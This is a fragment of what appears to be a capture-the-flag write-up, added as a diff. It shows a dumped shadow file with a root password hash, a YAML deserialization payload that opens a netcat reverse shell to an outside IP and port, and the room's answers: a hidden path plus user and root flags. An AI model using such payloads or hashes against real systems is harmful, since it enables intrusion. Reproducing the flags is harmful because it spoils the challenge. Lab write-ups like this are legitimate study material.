+root:$6$3ajDX6WW$tmjQSV8Zeh0B10ycUf5oNJYXHgE9hTc5zyFqyaaHs8ctD9uvXn8xUF1n6J35gjZ7RuYICoLlCEa7TrdBvsFrt1:18658:0:99999:7:::
+daemon:*:18655:0:99999:7:::
+bin:*:18655:0:99999:7:::
+sys:*:18655:0:99999:7:::
+sync:*:18655:0:99999:7:::
+games:*:18655:0:99999:7:::
+man:*:18655:0:99999:7:::
+lp:*:18655:0:99999:7:::
+mail:*:18655:0:99999:7:::
+news:*:18655:0:99999:7:::
+uucp:*:18655:0:99999:7:::
+proxy:*:18655:0:99999:7:::
+www-data:*:18655:0:99999:7:::
+backup:*:18655:0:99999:7:::
+list:*:18655:0:99999:7:::
+irc:*:18655:0:99999:7:::
+gnats:*:18655:0:99999:7:::
+nobody:*:18655:0:99999:7:::
+systemd-timesync:*:18655:0:99999:7:::
+systemd-network:*:18655:0:99999:7:::
+systemd-resolve:*:18655:0:99999:7:::
+systemd-bus-proxy:*:18655:0:99999:7:::
+syslog:*:18655:0:99999:7:::
+_apt:*:18655:0:99999:7:::
+lxd:*:18655:0:99999:7:::
+messagebus:*:18655:0:99999:7:::
+uuidd:*:18655:0:99999:7:::
+dnsmasq:*:18655:0:99999:7:::
+sshd:*:18655:0:99999:7:::
+pollinate:*:18655:0:99999:7:::
+imsau:!:18658:0:99999:7:::
+
+or can be
+
+!!python/object/new:os.system [rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 4444 >/tmp/f ]
+```
+Answer the questions below
+Name The Path.
+*/web/resources/infoseek/configure/key*
+What is the user flag?
+The path you get will forbid to see but you can bypass it.
+*1c5ccb6ce6f3561e302e0e516c633da9*
+What is the root flag?
+*5d45f08ee939521d59247233d3f8faf*
+
+## Notes / Lessons Learned
+[[pyLon]]
+
